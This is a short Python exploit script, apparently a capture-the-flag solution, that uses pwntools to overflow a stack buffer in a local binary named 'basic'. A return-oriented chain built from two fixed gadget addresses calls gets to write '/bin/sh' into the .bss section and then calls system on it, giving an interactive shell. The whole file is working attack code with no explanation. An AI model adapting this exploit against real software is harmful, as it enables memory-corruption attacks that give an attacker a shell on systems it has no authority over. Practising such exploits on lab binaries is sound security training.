#!/usr/bin/python 
from pwn import *

p = process("./basic")
elf = ELF("./basic")
libc = elf.libc 
rtc1 = 0x40073a
rtc2 = 0x400720
p1ret = 0x00400743

rbx = 0
rbp = 1

pay = 'A'*(0x90+0x8) + p64(rtc1)
pay += p64(rbx) + p64(rbp) + p64(elf.got['gets']) + p64(0) + p64(0) + p64(elf.bss())
pay += p64(rtc2)
pay += 'A'*8
pay += p64(rbx) + p64(rbp) + p64(elf.got['system']) + p64(0) + p64(0) + p64(elf.bss()) + p64(rtc2)
pay += 'A'*(7*8)

p.sendline(pay)
p.sendline("/bin/sh\x00")
#gdb.attach(p)
p.interactive()

